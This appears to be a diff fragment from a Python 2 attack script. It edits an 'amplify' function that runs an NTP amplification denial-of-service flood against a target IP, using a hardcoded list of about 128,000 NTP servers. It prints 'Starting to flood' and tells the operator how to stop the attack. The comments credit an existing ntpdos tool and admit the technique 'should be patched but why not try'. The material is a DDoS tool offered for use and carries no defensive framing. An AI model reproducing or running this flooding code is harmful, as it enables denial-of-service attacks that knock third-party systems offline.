@@ -111,7 +111,7 @@ def deny():
 
 
 #usng the ol' ntp amplification. shit should be patched but why not try?
-def amplify(targetIP, ntpServerFile):
+def amplify(targetIP):
     #https://github.com/vpnguy/ntpdos
 #by DaRkReD
 
@@ -119,10 +119,12 @@ def amplify(targetIP, ntpServerFile):
     #128437 ntp servers in txt file
     numOfServers = 128437
 
+    
+
     #System for accepting bulk input
     ntplist = []
     currentserver = 0
-    with open(ntpserverfile) as f:
+    with open("ntp-servers.txt") as f:
 	ntplist = f.readlines()
 
     #Make sure we dont out of bounds
@@ -136,7 +138,7 @@ def amplify(targetIP, ntpServerFile):
 
     #Hold our threads
     threads = []
-    print "Starting to flood: "+ target + " using NTP list: " + ntpserverfile + " With " + str(numberthreads) + " threads"
+    print "Starting to flood: "+ target + " using ntp-servers.txt  With " + str(numberthreads) + " threads"
     print "Use CTRL+C to stop attack"
 
     #Thread spawner
